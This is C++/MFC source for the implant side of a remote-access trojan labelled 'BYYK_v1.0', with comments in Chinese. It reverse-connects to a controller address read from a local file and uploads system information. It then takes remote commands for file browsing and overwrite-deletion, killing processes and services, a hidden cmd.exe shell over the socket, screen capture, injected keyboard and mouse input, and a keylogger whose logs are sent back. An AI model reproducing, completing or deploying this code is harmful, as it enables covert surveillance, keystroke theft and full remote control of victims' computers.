#include "stdafx.h"
#include "MyServer.h"
#include "MyServerDlg.h"
#include "comm.h"
#include "GetSysInfo.h"
#include "TcpTran.h"
#include "ProcessInfo.h"
#include "GetService.h"
#include "GetScreenToBitmap.h"
#include "jpegfile.h"
#include "huffman.h"
#include "shellapi.h"
#include "keylog.h"
#include "HttpAutoUpdate.h"

#define OVERWRITE_PASSES 10
#define BUFFER_SIZE 1024

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif


LINKINFO m_linkinfo;




BOOL WINAPI cmd_file_manage(SOCKET ClientSocket)
{
	CTcpTran m_tcptran ;   
	DRIVER driver;
	char chDriver[3];
	BOOL bnet=FALSE;
	driver.end=FALSE;
	
	for(char cc='A';cc<='Z';cc++)                        //遍历盘符
	{
		sprintf(chDriver,"%c:",cc);
		if(GetDriveType(chDriver)==DRIVE_FIXED)          //本机硬盘
		{
			strcpy(driver.driver,chDriver);
			driver.drivertype=DRIVE_FIXED;
			bnet=m_tcptran.mysend(ClientSocket,(char *)&driver,sizeof(driver),0,60);
		}
		else if(GetDriveType(chDriver)==DRIVE_CDROM)    //CD光驱 
		{
			strcpy(driver.driver,chDriver);
			driver.drivertype=DRIVE_CDROM;
			bnet=m_tcptran.mysend(ClientSocket,(char *)&driver,sizeof(driver),0,60);
		}
		else if(GetDriveType(chDriver)==DRIVE_REMOVABLE)//可移动存储介质
		{
			strcpy(driver.driver,chDriver);
			driver.drivertype=DRIVE_REMOVABLE;
			bnet=m_tcptran.mysend(ClientSocket,(char *)&driver,sizeof(driver),0,60);
		}
	}
    driver.end=TRUE;
	bnet=m_tcptran.mysend(ClientSocket,(char *)&driver,sizeof(driver),0,60);
    return bnet;
}

DWORD WINAPI cmd_proc_manage(SOCKET ClientSocket)
{	
	int nlen = 0;
	CTcpTran m_tcptran ;
	std::vector<PROCESSINFO*> pProcInfo;
    BOOL bOK = GetProcessList(&pProcInfo);
	if (bOK)
	{
		int Prcoinfo = pProcInfo.size();
		
		int processlen = m_tcptran.mysend(ClientSocket,(char *)&Prcoinfo,sizeof(Prcoinfo),0,60);
        
		PROCESSINFO *reMSG = new PROCESSINFO;
		for(int i=0; i<pProcInfo.size();i++)
		{
			reMSG = new PROCESSINFO;
			memset(reMSG, 0,sizeof(reMSG));            
			reMSG->PID=pProcInfo[i]->PID;
			lstrcpy(reMSG->ProcName,pProcInfo[i]->ProcName);
			lstrcpy(reMSG->ProcPath,pProcInfo[i]->ProcPath);
			nlen=m_tcptran.mysend(ClientSocket,(char *)reMSG,sizeof(PROCESSINFO),0,60);
            delete reMSG;
		}
	}

	return 0;	
}

DWORD WINAPI cmd_proc_kill(SOCKET ClientSocket,DWORD pid)
{
	int nlen = 0;

	CTcpTran m_tcptran ;

	KillProcess(pid);

	Sleep(1000);

	std::vector<PROCESSINFO*> pProcInfo;

    BOOL bOK = GetProcessList(&pProcInfo);

	if (bOK)
	{
		int Prcoinfo = pProcInfo.size();		
		int processlen = m_tcptran.mysend(ClientSocket,(char *)&Prcoinfo,sizeof(Prcoinfo),0,60);       
		PROCESSINFO *reMSG = new PROCESSINFO;
		for(int i=0; i<pProcInfo.size();i++)
		{
			reMSG = new PROCESSINFO;
			memset(reMSG, 0,sizeof(reMSG));            
			reMSG->PID=pProcInfo[i]->PID;
			lstrcpy(reMSG->ProcName,pProcInfo[i]->ProcName);
			lstrcpy(reMSG->ProcPath,pProcInfo[i]->ProcPath);
			nlen=m_tcptran.mysend(ClientSocket,(char *)reMSG,sizeof(PROCESSINFO),0,60);
            delete reMSG;
		}
	}

	return 0;	
}

DWORD WINAPI cmd_service_manage(SOCKET ClientSocket)
{

	int nlen = 0;
	CTcpTran m_tcptran ;

	std::vector<SERVICEINFO*> pServiceInfo;

    BOOL bOK = ListService(&pServiceInfo);

	if (bOK)
	{
		int Serviceinfo = pServiceInfo.size();
		
		int servicelen = m_tcptran.mysend(ClientSocket,(char *)&Serviceinfo,sizeof(Serviceinfo),0,60);
        
		SERVICEINFO *reMSG = new SERVICEINFO;
		for(int i=0; i<pServiceInfo.size();i++)
		{
			reMSG = new SERVICEINFO;			
			memset(reMSG, 0,sizeof(reMSG));            
			lstrcpy(reMSG->ServiceName,pServiceInfo[i]->ServiceName);
			lstrcpy(reMSG->ServiceDetail,pServiceInfo[i]->ServiceDetail);
			lstrcpy(reMSG->ServiceState,pServiceInfo[i]->ServiceState);
			lstrcpy(reMSG->ServiceStartType,pServiceInfo[i]->ServiceStartType);



			nlen=m_tcptran.mysend(ClientSocket,(char *)reMSG,sizeof(SERVICEINFO),0,60);
			
            delete reMSG;
		}
		//
	}
	//delete reMSG;
	return 0;   
}

DWORD WINAPI cmd_service_kill(SOCKET ClientSocket,char *chSvrid)
{
	int nlen = 0;

	CTcpTran m_tcptran ;

    BOOL killOk = KillService(chSvrid);

	if(killOk)
	{
        Sleep(1000);
	}			
		std::vector<SERVICEINFO*> pServiceInfo;
		
		BOOL bOK = ListService(&pServiceInfo);
		
		if (bOK)
		{
			int Serviceinfo = pServiceInfo.size();
			
			int servicelen = m_tcptran.mysend(ClientSocket,(char *)&Serviceinfo,sizeof(Serviceinfo),0,60);
			
			SERVICEINFO *reMSG = new SERVICEINFO;
			for(int i=0; i<pServiceInfo.size();i++)
			{
				reMSG = new SERVICEINFO;			
				memset(reMSG, 0,sizeof(reMSG));            
				lstrcpy(reMSG->ServiceName,pServiceInfo[i]->ServiceName);
				lstrcpy(reMSG->ServiceDetail,pServiceInfo[i]->ServiceDetail);
				lstrcpy(reMSG->ServiceState,pServiceInfo[i]->ServiceState);
				lstrcpy(reMSG->ServiceStartType,pServiceInfo[i]->ServiceStartType);
				
				nlen=m_tcptran.mysend(ClientSocket,(char *)reMSG,sizeof(SERVICEINFO),0,60);
				
				delete reMSG;
			}
			
		}
		


	return 0;   	
}


void cmd_file_GetSubOpenItem(SOCKET ClientSocket,char *szCurDir)     //展开目录
{
    CTcpTran m_tcptran ;
	HANDLE hFile;
	FILEINFO fileinfo;
	WIN32_FIND_DATA WFD;        //关于文件的全部属性信息

	//初始化fileinfo
	fileinfo.invalidir =0;
	fileinfo.isdirectory =0;
	fileinfo.next =0;
	fileinfo.filesize=0;
	fileinfo.filename[0]=0;
	fileinfo.time[0]=0;

	if((hFile=FindFirstFile(szCurDir,&WFD))==INVALID_HANDLE_VALUE)     //查找当前目录下的第一个文件，文件信息保存在WDF结构体中，返回hFile句柄给下次查找
	{
		fileinfo.invalidir =1;
		strcpy(fileinfo.filename ,"!*目录无法访问*!");
		fileinfo.next=1;
		m_tcptran.mysend(ClientSocket,(char *)&fileinfo,sizeof(FILEINFO),0,60);
		return;
	}

	SHFILEINFO shfi;
	char stime[32];
	SYSTEMTIME systime;
	FILETIME localtime;

	do
	{
	    //查完所有信息
		memset(&shfi,0,sizeof(shfi));
		SHGetFileInfo(WFD.cFileName, 
			              FILE_ATTRIBUTE_NORMAL,
			              &shfi, sizeof(shfi),
			              SHGFI_ICON|SHGFI_USEFILEATTRIBUTES|SHGFI_TYPENAME );
		//写入文件信息结构
	    strcpy(fileinfo.filename,WFD.cFileName);                              //文件名
        if(WFD.dwFileAttributes&FILE_ATTRIBUTE_DIRECTORY)                     //路径?
		      fileinfo.isdirectory=1;
        else
              fileinfo.isdirectory=0;
	    fileinfo.filesize=(WFD.nFileSizeHigh*MAXDWORD+WFD.nFileSizeLow)/1024+1; //文件大小
	    //转化格林时间到本地时间
	    FileTimeToLocalFileTime(&WFD.ftLastWriteTime,&localtime);
	    FileTimeToSystemTime(&localtime,&systime);
	    sprintf(stime,"%4d-%02d-%02d %02d:%02d:%02d",
		systime.wYear,systime.wMonth,systime.wDay,systime.wHour,
		systime.wMinute,systime.wSecond);
	    strcpy(fileinfo.time,stime);                                          //文件时间
        fileinfo.next=1;                                                      //next
		if(strcmp(WFD.cFileName,".")==0||strcmp(WFD.cFileName,"..")==0)
			continue;
		m_tcptran.mysend(ClientSocket,(char *)&fileinfo,sizeof(fileinfo),0,60); //发送文件信息
		if(GetLastError()==ERROR_NO_MORE_FILES)
				break;
	}while(FindNextFile(hFile,&WFD));                                         //遍历循环目录
	fileinfo.next =0;                                                         //结束遍历
	m_tcptran.mysend(ClientSocket,(char *)&fileinfo,sizeof(fileinfo),0,60);
	FindClose(hFile);
	return ;

}

DWORD WINAPI cmd_shell_manage(SOCKET s)
{

	CTcpTran m_tcptan;

//创建CMD线程

	HANDLE               hWritePipe,hReadPipe,hWriteShell,hReadShell;
	SECURITY_ATTRIBUTES  saPipe;
	STARTUPINFO          lpStartupInfo;
	PROCESS_INFORMATION  lpProcessInfo;
	char szBuffer[65535];
	DWORD dwBufferRead;
	int ret;
	saPipe.nLength              = sizeof(saPipe);
	saPipe.bInheritHandle       = TRUE;
	saPipe.lpSecurityDescriptor = NULL;

	//create read and write pipe
	CreatePipe(&hReadPipe, &hReadShell, &saPipe, 0);
	CreatePipe(&hWriteShell, &hWritePipe, &saPipe, 0);

	GetStartupInfo(&lpStartupInfo);
	lpStartupInfo.cb           = sizeof(lpStartupInfo);
	lpStartupInfo.dwFlags      = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
	lpStartupInfo.hStdInput    = hWriteShell;
	lpStartupInfo.hStdOutput   = hReadShell;
	lpStartupInfo.hStdError    = hReadShell;
	lpStartupInfo.wShowWindow  = SW_HIDE;
	lpStartupInfo.lpDesktop = (LPSTR)("WinSta0\\Default"); 

	WCHAR cmdline[MAX_PATH];
	GetSystemDirectory((LPSTR)cmdline,MAX_PATH);
	lstrcatW(cmdline,L"\\cmd.exe");
	ret = CreateProcess((char *)cmdline, NULL, NULL,NULL,TRUE,0,NULL,NULL,&lpStartupInfo,&lpProcessInfo);
	while(1)
	{
		memset(szBuffer, 0, sizeof(szBuffer));
		PeekNamedPipe(hReadPipe, szBuffer, sizeof(szBuffer), &dwBufferRead,NULL,NULL);
		if(dwBufferRead != 0)
		{
			ret = ReadFile(hReadPipe, szBuffer, sizeof(szBuffer), &dwBufferRead,NULL);
			if(ret)
			{
				if( m_tcptan.mysend(s,szBuffer, dwBufferRead,0,60) == SOCKET_ERROR)
					break;
			}
		}
		else
		{
			ZeroMemory(szBuffer, sizeof(szBuffer));
			ret = m_tcptan.myrecv(s,szBuffer, sizeof(szBuffer), 0, 60,0,false);
			if(ret == SOCKET_ERROR)
				break;
		}
		Sleep(100);
	}
	WriteFile(hWritePipe, "exit\r\n", (DWORD)strlen("exit\r\n"), &dwBufferRead, 0);	
	
	return 0;
}

DWORD WINAPI cmd_ctrl_GetScreen(SOCKET lp1,BYTE *lp2, BYTE *lp3, BYTE *lp4)
{
	CTcpTran m_tcptran;
	SOCKET lpWSK = (SOCKET ) lp1;  //第一个参数 socket
	JpegFile *pic = (JpegFile *)lp4;     //第四个参数 jpegFile
	LPCOMMAND lpSendMsg = (LPCOMMAND) lp2; //第三个参数 消息
	CGetScreenToBitmap *lpImage = (CGetScreenToBitmap *)lp3; //CGetScreenToBitmap * lpImage 添加类
	
	CHuffman *huf;


	unsigned long lWidth    =0;
	unsigned long lHeight   =0;
	unsigned long lHeight2  =0;
	unsigned long lSize     =0; 
	unsigned long lSize2    =0; 
	unsigned long lHeadSize =0;
	
	COMMAND SendMsg;

	memset(&SendMsg,0,sizeof(COMMAND));
	
	LPSTR lpData = NULL, lpData1 = NULL;//, lpOld = NULL;
    int nDelay = lpSendMsg->nDelay;

	//Step 1:抓屏幕
    if(lpImage->GetScreen(lpSendMsg->rcArea, 
		lpSendMsg->nBits, lpSendMsg->nArea) < 0) 
		return 1;  //Error 

//////////////////////////////////////////////////////////////////////
//经过Step 1 处理之后 结果在lpImage 这个类中 
//应用了 lpImage->m_dwBmpSize
//////////////////////////////////////////////////////////////////////

	//Setp 2:压缩图象
	SendMsg.dwFileSize = lpImage->m_dwBmpSize;   //图象体积	
	/*		*/
	if (lpSendMsg->nCompress == 2)
	{
		//使用 Jpeg压缩方式
		if (pic->m_lpScreenBuffer == NULL || lpImage->m_dwBmpSize > pic->m_dwScreenMaxSize)
		{
			if (pic->m_lpScreenBuffer) GlobalFree(pic->m_lpScreenBuffer);
			pic->m_dwScreenMaxSize = lpImage->m_dwBmpSize;
			pic->m_lpScreenBuffer = (BYTE *)GlobalAlloc(GMEM_FIXED, lpImage->m_dwBmpSize);
		}
		lpData = (LPSTR)pic->m_lpScreenBuffer;
		
		lSize = lpImage->m_dwBmpSize;
		lpData1 = (char *)pic->LoadBMP(lpImage->GetImage(),&lWidth, &lHeight);
		pic->RGBToJpegFile((unsigned char *)lpData1,(unsigned char *)lpData,lWidth, lHeight,true,80, &lSize);	
	}

//////////////////////////////////////////////////////////////////////////////
//经过Step 2 处理之后 lSize	lpData lpData1 lWidth lHeight 
// 用到了 lpData = (LPSTR)pic->m_lpScreenBuffer;
//        lpData1 = (char *)pic->LoadBMP(lpImage->GetImage(),&lWidth, &lHeight);
//        lSize = lpImage->m_dwBmpSize;
//////////////////////////////////////////////////////////////////////////////

	//Step 3: 发送图象
	//      nCell = lpSendMsg->nCell;
	
	SendMsg.dwBmpSize = lSize;    
    SendMsg.rcArea = lpImage->m_rcArea;   //source size
    //图象头信息
    if(m_tcptran.mysend(lpWSK,(char *)&SendMsg, sizeof(COMMAND),0, 60) < 0)
		goto err_01;
    if(lSize == 0) return 0;

    //图象部份
    if(m_tcptran.mysend(lpWSK,(char *)lpData, lSize,0, 60) < 0)
		goto err_01;
exit_01:
    //if (lpOld) GlobalFree(lpOld);
    return 0;
    
err_01:
    //if (lpOld) GlobalFree(lpOld);
    return -1;
	
}

void cmd_ctrl_CtrlAltDel()
{
   keybd_event (VK_CONTROL,0, 0,0);
   keybd_event (VK_MENU,0, 0,0);
   keybd_event (VK_DELETE,0, 0,0);
   ::Sleep(2000);
   keybd_event (VK_CONTROL,0, 0,KEYEVENTF_KEYUP);
   keybd_event (VK_MENU,0, 0,KEYEVENTF_KEYUP);
   keybd_event (VK_DELETE,0, 0,KEYEVENTF_KEYUP);
}

void cmd_ctrl_Mouse(BYTE *lpByte)
{
	COMMAND *lpSendMsg = (COMMAND *)lpByte;
	//移动鼠标
	mouse_event (MOUSEEVENTF_MOVE | MOUSEEVENTF_ABSOLUTE,
		lpSendMsg->dwHookParam1,
		lpSendMsg->dwHookParam2,0,0);
	
    if (lpSendMsg->wCmd == CMD_MOUSE_HOOK)  //单击
	{
		mouse_event (lpSendMsg->dwHookFlags,lpSendMsg->dwHookParam1,
			lpSendMsg->dwHookParam2,0,0);
	}
    else if(lpSendMsg->wCmd = CMD_MOUSE_DBHOOK )//双击
	{
		if(lpSendMsg->dwHookFlags== CMD_MOUSE_LDBCLICK)
		{  mouse_event (MOUSEEVENTF_LEFTDOWN|MOUSEEVENTF_ABSOLUTE,
		lpSendMsg->dwHookParam1,
		lpSendMsg->dwHookParam2,0,0);
		mouse_event (MOUSEEVENTF_LEFTUP,lpSendMsg->dwHookParam1,
			lpSendMsg->dwHookParam2,0,0);
		mouse_event (MOUSEEVENTF_LEFTDOWN|MOUSEEVENTF_ABSOLUTE,
			lpSendMsg->dwHookParam1,
			lpSendMsg->dwHookParam2,0,0);
		mouse_event (MOUSEEVENTF_LEFTUP,lpSendMsg->dwHookParam1,
			lpSendMsg->dwHookParam2,0,0);
		}
		if(lpSendMsg->dwHookFlags== CMD_MOUSE_RDBCLICK)
		{  
			mouse_event (MOUSEEVENTF_RIGHTDOWN|MOUSEEVENTF_ABSOLUTE,
				lpSendMsg->dwHookParam1,
				lpSendMsg->dwHookParam2,0,0);
			mouse_event (MOUSEEVENTF_RIGHTUP,lpSendMsg->dwHookParam1,
				lpSendMsg->dwHookParam2,0,0);
			mouse_event (MOUSEEVENTF_RIGHTDOWN|MOUSEEVENTF_ABSOLUTE,
				lpSendMsg->dwHookParam1,
				lpSendMsg->dwHookParam2,0,0);
			mouse_event (MOUSEEVENTF_RIGHTUP,lpSendMsg->dwHookParam1,
				lpSendMsg->dwHookParam2,0,0);
		}
	}
}

BOOL WINAPI cmd_file_del(char filename[])
{
      HANDLE hFile = CreateFile(filename, 
		                        GENERIC_WRITE, 
								FILE_SHARE_READ|FILE_SHARE_WRITE, 
                                NULL, 
								OPEN_ALWAYS, 
								FILE_FLAG_WRITE_THROUGH, 
								NULL);

       if (hFile == INVALID_HANDLE_VALUE) return false;
       DWORD fileSize = GetFileSize(hFile, 0);
       // if file is empty.
       if (!fileSize)
       {
              CloseHandle(hFile);
              return false;
       }
       for (int passes = 0; passes < OVERWRITE_PASSES; passes++)
       {
              char newStorage[BUFFER_SIZE];
              srand((unsigned)time(NULL));
              FillMemory((void*)newStorage, BUFFER_SIZE, rand() % 255);
              SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
              DWORD left = fileSize;
              int write = BUFFER_SIZE;
              DWORD written = 0;
              while (left)
              {
                     if (left < BUFFER_SIZE) write = left;                    
                     BOOL status = WriteFile(hFile, newStorage, write, &written, NULL);
                     if (!status)
                     {
                            CloseHandle(hFile);
                            return false;
                     } 
                     left -= write;
              }
       }
       CloseHandle(hFile);
       if (!DeleteFile(filename)) return false;
       return true;
}

UINT cmd_ctrl_shell(SOCKET sock,char command[])
{


    CTcpTran m_tcptran;

	//COMMAND m_command;
	//memset(&m_command,0,sizeof(COMMAND));

    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    HANDLE hRead=NULL,hWrite=NULL;

    TCHAR Cmdline[300]={0};     //命令行缓冲
    char SendBuf[2048]={0};    //发送缓冲
    SECURITY_ATTRIBUTES sa;     //安全描述符
    DWORD bytesRead=0;
    int ret=0;

    sa.nLength=sizeof(SECURITY_ATTRIBUTES);
    sa.lpSecurityDescriptor=NULL;
    sa.bInheritHandle=TRUE;

    //创建匿名管道
    if (!CreatePipe(&hRead,&hWrite,&sa,0))  
         goto Clean;//失败

    si.cb=sizeof(STARTUPINFO);
    GetStartupInfo(&si);
    si.hStdError=hWrite;
    si.hStdOutput=hWrite;    //进程（cmd）的输出写入管道
    si.wShowWindow=SW_HIDE;
    si.dwFlags=STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;

    GetSystemDirectory(Cmdline,sizeof (Cmdline));   //获取系统目录
    strcat(Cmdline,"\\cmd.exe /c ");                //拼接cmd
    strcat(Cmdline,command);  //拼接一条完整的cmd命令

    //创建进程，也就是执行cmd命令
    if (!CreateProcess(NULL,Cmdline,NULL,NULL,TRUE,NULL,NULL,NULL,&si,&pi)) 
         goto Clean;//失败

    CloseHandle(hWrite);

    while (TRUE)
    {
      //无限循环读取管道中的数据，直到管道中没有数据为止
      if (ReadFile(hRead,SendBuf,sizeof (SendBuf),&bytesRead,NULL)==0)
          break;
      m_tcptran.mysend(sock,SendBuf,bytesRead,0,60);      //发送出去
      memset(SendBuf,0,sizeof (SendBuf));  //缓冲清零
      Sleep(100);                          //休息一下
     }

    m_tcptran.mysend(sock,(char *)MY_END,sizeof(MY_END),0,60);
Clean:
          //释放句柄
          if (hRead!=NULL)
              CloseHandle(hRead);

          if (hWrite!=NULL)
              CloseHandle(hWrite);

	return 0;
}



UINT cmd_keylog()
{

	char filename[100] ={0};//保存文件名
	char syspath[MAX_PATH] ={0};

	SYSTEMTIME sysTm;
	::GetLocalTime(&sysTm);
	int m_nYear = sysTm.wYear;
	int m_nMonth = sysTm.wMonth;
	int m_nDay = sysTm.wDay;

	sprintf(filename,"Key_%d_%d_%d.log",m_nYear,m_nMonth,m_nDay);
	GetSystemDirectory(syspath,MAX_PATH);

	strcat(syspath,"\\");
	strcat(syspath,filename);
	
	g_hHook=SetWindowsHookEx(WH_JOURNALRECORD,KeyboardProc,GetModuleHandle(NULL),0);

	return 0;
    	
}

UINT cmd_stop_keylog(SOCKET s)
{
    CTcpTran m_tcptran;

	char filename[100] ={0};//保存文件名
	char syspath[MAX_PATH] ={0};

	SYSTEMTIME sysTm;
	::GetLocalTime(&sysTm);
	int m_nYear = sysTm.wYear;
	int m_nMonth = sysTm.wMonth;
	int m_nDay = sysTm.wDay;

	sprintf(filename,"Key_%d_%d_%d.log",m_nYear,m_nMonth,m_nDay);
	GetSystemDirectory(syspath,MAX_PATH);

	strcat(syspath,"\\");
	strcat(syspath,filename);
	HANDLE hFile = CreateFile(syspath,
		                     GENERIC_READ|GENERIC_WRITE,
							 FILE_SHARE_WRITE|FILE_SHARE_READ,
							 0,
							 OPEN_EXISTING,
							 FILE_ATTRIBUTE_NORMAL,
							 NULL);

    DWORD dwSize=GetFileSize(hFile,NULL); 

    int SendFileSize = m_tcptran.mysend(s,(char *)&dwSize,sizeof(DWORD),0,60);
	
	char buf[1024]={0};

    if (SendFileSize)
	{

		DWORD Realbufsize = 0;

		int SendFile =0;
		BOOL bread = FALSE;


		DWORD SendSize =0;

		while (SendSize<dwSize)
		{
			if (dwSize-SendSize<1024)
			{
				bread= ReadFile(hFile,
			                 buf,
							 dwSize,
                             &Realbufsize,
							 NULL);

				SendFile = m_tcptran.mysend(s,buf,dwSize,0,60);

				dwSize = dwSize - dwSize;
			}
			else
			{
				bread= ReadFile(hFile,
			                 buf,
							 1024,
                             &Realbufsize,
							 NULL);
				SendFile = m_tcptran.mysend(s,buf,1024,0,60);
				dwSize = dwSize -1024;

			}
			
		}
    }
    
	CloseHandle(hFile);

	if(g_hHook)
	{
		UnhookWindowsHookEx(g_hHook);
	}

	return 0;
}

DWORD WINAPI MyClientThread(LPVOID lp)
{

    CGetScreenToBitmap Image;
	JpegFile pic;
    int      nRet;
	HDC		 hDC;
	BYTE *lpData;

    LPLINKINFO m_tmp = (LPLINKINFO)lp ;	
	CTcpTran m_tcptran ;
	BOOL bOK = m_tcptran.InitSocketLibray(2,2);

	if (bOK==0)
	{
       return -1; 
	}


retry:

    SOCKET s = m_tcptran.InitSocket(SOCKETNOBIND,m_tmp->strBindIp,m_tmp->BindPort,0);        //非绑定连接，反向连接控制端

	if(s == SOCKET_ERROR)
	{
		goto retry;
	}

	SYSTEMINIT m_sendmsg ;                                        //定义一个消息发送结构

	GetClientSystemInfo(m_sendmsg);                               //获取本机信息
	memcpy(m_sendmsg.version,"BYYK_v1.0",sizeof("BYYK_v1.0"));    //软件版本
	
	nRet = m_tcptran.mysend(s,(char *)&m_sendmsg,sizeof(m_sendmsg),0,60);    //上传本机信息

    if (nRet<0)                                                   //发送失败重新发送
	{
		m_tcptran.mysend(s,(char *)&m_sendmsg,sizeof(m_sendmsg),0,60);
    }
     COMMAND m_command;                                           //定义命令结构

	 COMMAND m_filetmp;
	 memset(&m_filetmp,0,sizeof(COMMAND));


	 DWORD dw_hThreadid = 0;
     HANDLE hThread = NULL;
	 BOOL   HaveChild = false;
     BOOL   OKfiledel = false;

	 int    bret=0;

Loop01:
	while(true)                                                         //循环等待接收命令
	{
		bret=0;
		memset((char  *)&m_command, 0,sizeof(m_command));
//retryrecv:
		bret = m_tcptran.myrecv(s,(char *)&m_command,sizeof(m_command),0,60,0,FALSE);

		switch (m_command.wCmd)                                         //命令解析
		{ 
			case CMD_RETRY:	                                            
				 goto exit01;
			case CMD_PROCESS_MANAGE:                                    //进程管理
				cmd_proc_manage(s);
				goto Loop01;                                            //执行完相应的命令跳转到循环等待
			case CMD_SERVICE_MANAGE:                                    //服务管理
				cmd_service_manage(s);
				goto Loop01;
			case CMD_FILE_MANAGE:                                       //文件管理
				cmd_file_manage(s);
				goto Loop01;
			case CMD_FILE_GETSUBFILE:                                   //展开目录
				cmd_file_GetSubOpenItem(s,m_command.szCurDir);

				goto Loop01;
				
			case CMD_FILE_DEL:
				OKfiledel = cmd_file_del(m_command.szCurDir);

				goto Loop01;
				
			case CMD_CMDSHELL:                                           //远程shell
				cmd_ctrl_shell(s,m_command.szCurDir);
				goto Loop01;
			case CMD_KEYLOG_STOP:
				cmd_stop_keylog(s);
				goto Loop01; 
			case CMD_SCREEN_MANAGE:                                      //屏幕监控
				nRet = cmd_ctrl_GetScreen(s, (BYTE*)&m_command, (BYTE *)&Image, (BYTE *)&pic);			   
				if(nRet == -1) goto exit01;
				goto Loop01;
			case CMD_GET_SCREEN_INFO://取屏幕分辨率信息
				memset((char  *)&m_command, 0,sizeof(m_command));
				hDC = CreateDC("DISPLAY",NULL,NULL,NULL);
				m_command.nBits = GetDeviceCaps(hDC, BITSPIXEL);
				m_command.nBits = m_command.nBits * GetDeviceCaps(hDC, PLANES);
				DeleteDC (hDC);
				m_command.rcArea = CRect(0,0,GetSystemMetrics (SM_CXSCREEN),GetSystemMetrics (SM_CYSCREEN));
				if(m_tcptran.mysend(s,(char *)&m_command,sizeof(m_command),0,60) < 0)
					goto exit01;
				goto Loop01;
			case CMD_KEY_HOOK:  
				keybd_event ((BYTE)m_command.dwHookParam1,(BYTE)m_command.dwHookParam2,m_command.dwHookFlags,0);
				goto Loop01;
			case CMD_MOUSE_HOOK:
			case CMD_MOUSE_DBHOOK:
				cmd_ctrl_Mouse((BYTE *)&m_command);
				goto Loop01;
			case CMD_KEY_CAD: //Ctrl+Alt+Delete
				cmd_ctrl_CtrlAltDel();
				goto Loop01;
			case CMD_SHELL_MANAGE:
				cmd_shell_manage(s);
				goto Loop01;
			case CMD_NULL:
				goto exit01;
			case CMD_REG_MANAGE: 
				goto Loop01; 
			case CMD_VIDEO_MANAGE:
				goto Loop01;
			case CMD_KEYLOG_MANAGE:
				cmd_keylog();
				goto Loop01;
			case CMD_PROCESS_KILL:
				cmd_proc_kill(s,m_command.DataSize);
				goto Loop01;
			case CMD_SERVICE_DEL:
				cmd_service_kill(s,m_command.tmp);
				goto Loop01;
		}
		
	}
exit02:
    goto retry;

exit01:

	return 0;

}

//////////////////////////////////////////////////////////////////////////

CMyServerDlg::CMyServerDlg(CWnd* pParent /*=NULL*/)
	: CDialog(CMyServerDlg::IDD, pParent)
{
	//{{AFX_DATA_INIT(CMyServerDlg)
	//}}AFX_DATA_INIT
	// Note that LoadIcon does not require a subsequent DestroyIcon in Win32
	//m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
}

void CMyServerDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CMyServerDlg)
	//DDX_Control(pDX, IDC_BUTTON_START, m_btn_start);
	//}}AFX_DATA_MAP
	DDX_Control(pDX, IDC_IP, m_ip);
	DDX_Control(pDX, IDC_PORT, m_port);
}

BEGIN_MESSAGE_MAP(CMyServerDlg, CDialog)
	//{{AFX_MSG_MAP(CMyServerDlg)
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CMyServerDlg message handlers


DWORD  dw_thread = 0 ;

UINT m_timerID1;

UINT i=0;

BOOL CMyServerDlg::OnInitDialog()
{
	CDialog::OnInitDialog();



	hThread[0]=NULL;
	hThread[1]=NULL;
		
	char seps[]= "/";
	char *token;
	char myURL[MAX_PATH] ={0};
	char myFILE[MAX_PATH] = {0};
	char tmp[MAX_PATH] ={0};
	char SysPath[MAX_PATH]="c:\\lplist.txt";    //控制端地址文件

    char  buf[1024]={0};                        //分析文件 解析文件 把IP地址和端口分离出来
	DWORD ReadSize = 0;	
	char tmp1[MAX_PATH]={0};
	char port[MAX_PATH]={0};
	char ip[MAX_PATH]={0};
	
	HANDLE hFile = CreateFile(SysPath,GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);
	if (hFile)
	{
		BOOL bRead = ReadFile(hFile,buf,1024,&ReadSize,NULL);
		if (bRead)
		{
			strcpy(tmp1,buf);
			strcpy(port,buf);				
			TCHAR  *pos=strrchr(tmp1,':');			
			strcpy(port,pos+1);			
			tmp1[pos-tmp1]=0;		 
			strcpy(ip,tmp1);
		}

	}

    m_linkinfo.BindPort  = atoi(port) ;                 // 把读取的ip和端口赋值
	GetDlgItem(IDC_PORT)->SetWindowText(port);          //显示端口
	GetDlgItem(IDC_IP)->SetWindowText(ip);              //显示ip地址
	m_linkinfo.strBindIp = ip;
    i=0;
    hThread[i] = CreateThread(NULL,0,MyClientThread,(LPVOID)&m_linkinfo,0,&dw_thread);      //创建服务线程
	return TRUE;  // return TRUE  unless you set the focus to a control
}

// If you add a minimize button to your dialog, you will need the code below
//  to draw the icon.  For MFC applications using the document/view model,
//  this is automatically done for you by the framework.

void CMyServerDlg::OnPaint() 
{
	if (IsIconic())
	{
		CPaintDC dc(this); // device context for painting

		SendMessage(WM_ICONERASEBKGND, (WPARAM) dc.GetSafeHdc(), 0);

		// Center icon in client rectangle
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// Draw the icon
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialog::OnPaint();
	}
}

// The system calls this to obtain the cursor to display while the user drags
//  the minimized window.
HCURSOR CMyServerDlg::OnQueryDragIcon()
{
	return (HCURSOR) m_hIcon;
}



